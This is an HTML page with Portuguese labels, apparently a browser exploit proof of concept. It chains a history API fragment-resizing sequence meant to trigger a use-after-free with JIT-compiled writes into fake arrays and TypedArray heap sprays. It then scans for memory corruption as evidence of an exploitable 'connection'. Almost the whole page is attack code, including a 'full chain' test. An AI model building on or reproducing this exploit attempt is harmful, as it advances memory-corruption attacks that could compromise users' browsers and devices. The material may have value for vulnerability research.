
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Opcao B - Timing Preciso JIT+UAF</title>
</head>
<body>
<h1>Opcao B - Ultima Tentativa de Conexao</h1>
<h2>JIT OOB + UAF com Timing Critico</h2>

<button onclick="testB1()">B1 - FakeArray DENTRO da janela UAF</button><br><br>
<button onclick="testB2()">B2 - JIT Write DURANTE back() assincrono</button><br><br>
<button onclick="testB3()">B3 - TypedArray no momento exato do collapse</button><br><br>
<button onclick="testB4()">B4 - Chain completa (todas tecnicas)</button><br><br>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ========================================
// UAF TRIGGER - SEQUENCIA VALIDADA
// ========================================
async function triggerUAF() {
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;
    
    for(let i = 0; i < 48; i++) {
        let frag = "A".repeat(size);
        history.pushState({i: i}, "", "#" + frag);
        history.replaceState({i: i}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) {
            setTimeout(() => history.back(), 0);
            log("[ITER " + i + "] back() async");
        }
        
        size += STEP;
        await sleep(5);
    }
    
    log(">>> UAF WINDOW <<<");
}

// ========================================
// JIT SETUP
// ========================================
function setupJIT() {
    log(">>> JIT SETUP <<<");
    
    function jitFunc(arr, idx, val) {
        arr[idx] = val;
        return arr[idx];
    }
    
    // Warm up com array real
    let warmup = new Uint32Array(8);
    for(let i = 0; i < 15000; i++) {
        jitFunc(warmup, i % 8, i);
    }
    
    log("JIT compilado");
    return jitFunc;
}

// ========================================
// B1: FAKE ARRAY DENTRO DA JANELA UAF
// ========================================
async function testB1() {
    logEl.textContent = "";
    log("=== B1: FAKE ARRAY DENTRO DA JANELA UAF ===\n");
    
    let jitFunc = setupJIT();
    
    await triggerUAF();
    
    // CRITICO: Criar fake array AQUI, dentro da janela
    log("\n>>> CRIANDO FAKE ARRAY NA JANELA CRITICA <<<");
    
    let fakeArray = {
        0: 0, 1: 0, 2: 0, 3: 0, 4: 0, 5: 0, 6: 0, 7: 0,
        length: 0x10000  // 64KB fake
    };
    
    log("FakeArray criado com length: " + fakeArray.length);
    
    // Usar JIT IMEDIATAMENTE
    log("\n>>> USANDO JIT NA JANELA UAF <<<");
    for(let i = 0; i < 100; i++) {
        jitFunc(fakeArray, 1000 + i, 0xBEEF0000 + i);
    }
    
    log("JIT writes executados");
    
    // Agora sim, collapse
    await sleep(120);
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    await sleep(50);
    
    // Diagnostico
    diagnose();
    
    // Verificar fakeArray
    log("\n>>> VERIFICANDO FAKE ARRAY <<<");
    for(let i = 1000; i < 1010; i++) {
        let val = fakeArray[i];
        log("fakeArray[" + i + "] = 0x" + val.toString(16));
        if(val !== (0xBEEF0000 + (i - 1000))) {
            log("  >>> ANOMALIA! Valor esperado: 0x" + (0xBEEF0000 + (i - 1000)).toString(16));
        }
    }
    
    window.__b1 = fakeArray;
    log("\n=== FIM B1 ===");
}

// ========================================
// B2: JIT WRITE DURANTE BACK() ASSINCRONO
// ========================================
async function testB2() {
    logEl.textContent = "";
    log("=== B2: JIT WRITE DURANTE BACK() ===\n");
    
    let jitFunc = setupJIT();
    
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;
    
    let fakeArray = {
        0: 0, 1: 0, 2: 0, 3: 0,
        length: 0x10000
    };
    
    for(let i = 0; i < 48; i++) {
        let frag = "A".repeat(size);
        history.pushState({i: i}, "", "#" + frag);
        history.replaceState({i: i}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) {
            setTimeout(() => history.back(), 0);
            log("[ITER " + i + "] back() async");
            
            // CRITICO: Executar JIT NO MESMO MOMENTO
            for(let j = 0; j < 50; j++) {
                jitFunc(fakeArray, 500 + j, 0xDEAD0000 + j);
            }
        }
        
        size += STEP;
        await sleep(5);
    }
    
    log(">>> UAF WINDOW <<<");
    await sleep(120);
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    await sleep(50);
    
    diagnose();
    
    log("\n>>> VERIFICANDO FAKE ARRAY <<<");
    let anomalies = 0;
    for(let i = 500; i < 510; i++) {
        let val = fakeArray[i];
        let expected = 0xDEAD0000 + (i - 500);
        log("fakeArray[" + i + "] = 0x" + val.toString(16) + " (expect: 0x" + expected.toString(16) + ")");
        if(val !== expected) {
            anomalies++;
        }
    }
    
    if(anomalies > 0) {
        log("\n>>> " + anomalies + " ANOMALIAS DETECTADAS!");
    }
    
    window.__b2 = fakeArray;
    log("\n=== FIM B2 ===");
}

// ========================================
// B3: TYPEDARRAY NO MOMENTO EXATO DO COLLAPSE
// ========================================
async function testB3() {
    logEl.textContent = "";
    log("=== B3: TYPEDARRAY NO MOMENTO DO COLLAPSE ===\n");
    
    let jitFunc = setupJIT();
    
    await triggerUAF();
    
    log("\n>>> MOMENTO CRITICO: COLLAPSE + TYPEDARRAY <<<");
    
    // Criar TypedArray no exato momento do collapse
    Promise.resolve().then(() => {
        log("Microtask: criando TypedArrays...");
        
        let arrays = [];
        for(let i = 0; i < 3000; i++) {
            let arr = new Uint32Array(8);
            // Preencher com pattern
            for(let j = 0; j < 8; j++) {
                arr[j] = 0xCAFE0000 + i;
            }
            arrays.push(arr);
        }
        
        window.__arrays = arrays;
        log("Criados " + arrays.length + " TypedArrays");
    });
    
    // Collapse no mesmo tick
    history.replaceState({}, "", "#X");
    
    await sleep(100);
    
    diagnose();
    
    // Verificar se algum TypedArray foi afetado
    log("\n>>> VERIFICANDO TYPEDARRAY CORRUPTION <<<");
    let corrupted = 0;
    
    if(window.__arrays) {
        for(let i = 0; i < window.__arrays.length; i++) {
            let arr = window.__arrays[i];
            for(let j = 0; j < arr.length; j++) {
                let expected = 0xCAFE0000 + i;
                if(arr[j] !== expected) {
                    log("Array[" + i + "][" + j + "] = 0x" + arr[j].toString(16) + " (esperado: 0x" + expected.toString(16) + ")");
                    corrupted++;
                    if(corrupted >= 10) break;
                }
            }
            if(corrupted >= 10) break;
        }
    }
    
    if(corrupted > 0) {
        log("\n>>> " + corrupted + " CORRUPCOES DETECTADAS!");
    } else {
        log("Nenhuma corrupcao detectada");
    }
    
    log("\n=== FIM B3 ===");
}

// ========================================
// B4: CHAIN COMPLETA
// ========================================
async function testB4() {
    logEl.textContent = "";
    log("=== B4: CHAIN COMPLETA - TODAS AS TECNICAS ===\n");
    
    let jitFunc = setupJIT();
    
    // FASE 1: Pre-alocar TypedArrays
    log(">>> FASE 1: PRE-ALOCACAO <<<");
    let preArrays = [];
    for(let i = 0; i < 1000; i++) {
        preArrays.push(new Uint32Array(16));
    }
    log("Pre-alocados: " + preArrays.length + " TypedArrays");
    
    // FASE 2: Criar fake array
    log("\n>>> FASE 2: FAKE ARRAY SETUP <<<");
    let fakeArray = {
        0: 0, 1: 0, 2: 0, 3: 0,
        length: 0x20000  // 128KB
    };
    
    // FASE 3: UAF Trigger com JIT simultâneo
    log("\n>>> FASE 3: UAF + JIT SIMULTANEO <<<");
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;
    
    for(let i = 0; i < 48; i++) {
        let frag = "A".repeat(size);
        history.pushState({i: i}, "", "#" + frag);
        history.replaceState({i: i}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) {
            setTimeout(() => history.back(), 0);
            
            // JIT write simultâneo
            for(let j = 0; j < 20; j++) {
                jitFunc(fakeArray, 2000 + i * 20 + j, 0xBEEF0000 + j);
            }
        }
        
        size += STEP;
        await sleep(5);
    }
    
    log(">>> UAF WINDOW <<<");
    
    // FASE 4: TypedArray spray NA JANELA
    log("\n>>> FASE 4: TYPEDARRAY SPRAY NA JANELA <<<");
    let windowArrays = [];
    for(let i = 0; i < 2000; i++) {
        let arr = new Uint32Array(8);
        for(let j = 0; j < 8; j++) {
            arr[j] = 0xDEAD0000 + i;
        }
        windowArrays.push(arr);
    }
    log("Window spray: " + windowArrays.length);
    
    // FASE 5: Collapse
    await sleep(120);
    log("\n>>> FASE 5: FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    await sleep(50);
    
    // FASE 6: Diagnostico completo
    log("\n>>> FASE 6: DIAGNOSTICO COMPLETO <<<");
    diagnose();
    
    // Verificar fake array
    log("\n>>> VERIFICANDO FAKE ARRAY <<<");
    let fakeAnomalies = 0;
    for(let i = 2000; i < 2020; i++) {
        let val = fakeArray[i];
        if(val !== undefined && val !== 0) {
            log("fakeArray[" + i + "] = 0x" + val.toString(16));
            fakeAnomalies++;
        }
    }
    
    // Verificar TypedArrays
    log("\n>>> VERIFICANDO TYPEDARRAY CORRUPTION <<<");
    let arrayAnomalies = 0;
    for(let i = 0; i < Math.min(100, windowArrays.length); i++) {
        let arr = windowArrays[i];
        for(let j = 0; j < arr.length; j++) {
            let expected = 0xDEAD0000 + i;
            if(arr[j] !== expected) {
                log("windowArrays[" + i + "][" + j + "] = 0x" + arr[j].toString(16));
                arrayAnomalies++;
                if(arrayAnomalies >= 5) break;
            }
        }
        if(arrayAnomalies >= 5) break;
    }
    
    log("\n>>> RESULTADOS FINAIS <<<");
    log("Fake array anomalias: " + fakeAnomalies);
    log("TypedArray anomalias: " + arrayAnomalies);
    
    if(fakeAnomalies > 0 || arrayAnomalies > 0) {
        log("\n>>> POSSIVEL CONEXAO DETECTADA!");
    } else {
        log("\n>>> Nenhuma conexao detectada");
    }
    
    window.__b4 = {fakeArray, preArrays, windowArrays};
    log("\n=== FIM B4 ===");
}

// ========================================
// DIAGNOSTICO
// ========================================
function diagnose() {
    log("\n=== DIAGNOSTICO URL ===");
    let url = location.href;
    log("URL.length: " + url.length);
    log("hash.length: " + location.hash.length);
    
    // Scan detalhado
    let offsets = [0, 30, 31, 32, 33, 34, 35, 36, 64, 128];
    for(let off of offsets) {
        let code = url.charCodeAt(off);
        let char = isNaN(code) ? "NaN" : String.fromCharCode(code);
        log("[" + off + "] = " + code + " (0x" + code.toString(16) + ") '" + char + "'");
    }
}

log("Escolha um teste B1-B4 para executar.");
log("\nB1: FakeArray dentro da janela");
log("B2: JIT write durante back()");
log("B3: TypedArray no momento do collapse");
log("B4: CHAIN COMPLETA (recomendado)");
</script>

</body>
</html>
